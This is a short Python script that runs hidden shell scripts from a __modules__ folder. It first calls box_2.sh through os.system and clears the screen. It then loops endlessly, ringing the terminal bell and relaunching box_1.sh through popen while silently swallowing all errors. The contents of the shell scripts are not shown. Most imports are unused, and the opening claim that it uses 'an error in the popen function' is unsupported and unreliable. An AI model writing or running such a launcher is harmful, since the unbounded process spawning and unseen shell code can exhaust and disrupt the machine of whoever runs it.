#!/usr/bin/env python3

# This code uses an error in the popen function of the os module

from os import system
from re import search
from os import popen
from time import sleep
from os import makedirs
from operator import eq
from operator import ne
from operator import le
from operator import ge
from operator import lt
from operator import gt
from os import removedirs
from copy import deepcopy

import os
import tty
import time
import random
import pkgutil
import operator
import sysconfig
import contextlib
import dataclasses
import configparser

with open("__modules__/box_2.sh") as code:
     check = str(system(code.read()))
     system("clear")

start_bug = True

while start_bug == True:
    try:
        with open("__modules__/box_1.sh") as code:
            try:
                print("\a\a")
                check = popen(code.read())

            except:
                sleep(0)

    except:
        sleep(0)
